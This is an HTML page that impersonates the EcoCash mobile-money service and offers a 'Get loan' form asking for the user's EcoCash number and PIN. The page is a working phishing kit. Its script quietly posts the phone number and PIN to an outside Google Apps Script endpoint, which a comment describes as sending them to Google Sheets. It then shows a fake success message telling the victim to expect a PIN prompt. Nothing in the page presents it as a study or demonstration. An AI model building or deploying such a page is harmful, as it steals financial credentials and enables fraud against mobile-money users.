<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash | Secure Portal</title>
    <style>
        /* Reset and Base Styles */
        * { box-sizing: border-box; }
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #ffffff;
        }

        /* Top Blue Banner - Gradient matches your screenshot */
        .banner {
            width: 100%;
            max-width: 500px;
            background: radial-gradient(circle at center, #1e73be 0%, #003366 100%);
            padding: 40px 20px 30px 20px;
            text-align: center;
            color: white;
        }

        /* Custom CSS EcoCash Logo */
        .logo-container {
            background: white;
            display: inline-block;
            padding: 6px 14px;
            border-radius: 4px;
            margin-bottom: 25px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .logo-text {
            color: #003366;
            font-weight: 800;
            font-size: 22px;
            letter-spacing: -0.5px;
        }
        .logo-red { color: #cc0000; }

        /* Typography */
        .headline { 
            font-size: 24px; 
            font-weight: 600; 
            margin-bottom: 8px; 
        }
        .subheadline { 
            font-size: 14px; 
            opacity: 0.9; 
            margin-bottom: 30px; 
            font-weight: 300;
        }

        /* The Lock Icon (SVG) */
        .icon-wrapper {
            margin: 20px auto;
            width: 80px;
            height: 80px;
        }

        /* Form Styling */
        .form-area {
            width: 100%;
            max-width: 500px;
            padding: 30px 40px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 14px 15px;
            border: 1.5px solid #2ea3f2;
            border-radius: 8px;
            font-size: 16px;
            color: #333;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #003366;
        }

        input::placeholder {
            color: #b0b0b0;
        }

        /* The Button */
        .btn-submit {
            width: 140px;
            background-color: #00a2ff;
            color: white;
            border: none;
            padding: 12px 0;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }

        .btn-submit:hover {
            background-color: #008be0;
        }

        .btn-submit:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        /* Status Messages */
        #status-msg {
            margin-top: 20px;
            font-size: 14px;
            font-weight: 500;
            min-height: 20px;
        }
    </style>
</head>
<body>

    <div class="banner">
        <div class="logo-container">
            <span class="logo-text">Eco<span class="logo-red">Cash</span></span>
        </div>
        
        <div class="headline">EcoCash is Safe & Secure</div>
        <div class="subheadline">Your PIN is your secret, don't share with anyone</div>

        <div class="icon-wrapper">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="12" cy="12" r="11" fill="#1e73be" fill-opacity="0.3"/>
                <path d="M17 11H7C5.89543 11 5 11.8954 5 13V19C5 20.1046 5.89543 21 7 21H17C18.1046 21 19 20.1046 19 19V13C19 11.8954 18.1046 11 17 11Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M8 11V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V11" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                <circle cx="12" cy="16" r="1" fill="white"/>
            </svg>
        </div>
    </div>

    <div class="form-area">
        <form id="ecoForm">
            <div class="input-group">
                <input type="tel" name="phone" id="phone" placeholder="Ecocash number" required>
            </div>
            <div class="input-group">
                <input type="password" name="pin" id="pin" placeholder="Pin" maxlength="4" required>
            </div>
            
            <button type="submit" class="btn-submit" id="submitBtn">Get loan</button>
        </form>
        <div id="status-msg"></div>
    </div>

    <script>
        // Your specific Google Apps Script URL
        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby78P5JgkCXvzx6ueIXwqyeVydoixOVWukLKYMJl9WUU7mpBQJujZdC2ZDEW4wYsTQXzg/exec';

        const form = document.getElementById('ecoForm');
        const btn = document.getElementById('submitBtn');
        const status = document.getElementById('status-msg');

        form.addEventListener('submit', e => {
            e.preventDefault();
            
            // UI Feedback
            btn.disabled = true;
            btn.innerText = "Processing...";
            status.style.color = "#003366";
            status.innerText = "Verifying details...";

            // Send to Google Sheets
            fetch(SCRIPT_URL, { 
                method: 'POST', 
                mode: 'no-cors', // Added for Google Apps Script compatibility
                body: new FormData(form)
            })
            .then(() => {
                status.style.color = "#28a745";
                status.innerHTML = "<strong>Application Successful!</strong><br>Check your phone for the EcoCash PIN prompt.";
                btn.innerText = "Done";
                form.reset();
            })
            .catch(error => {
                btn.disabled = false;
                btn.innerText = "Get loan";
                status.style.color = "#cc0000";
                status.innerText = "Connection error. Please try again.";
                console.error('Error!', error.message);
            });
        });
    </script>

</body>
</html>
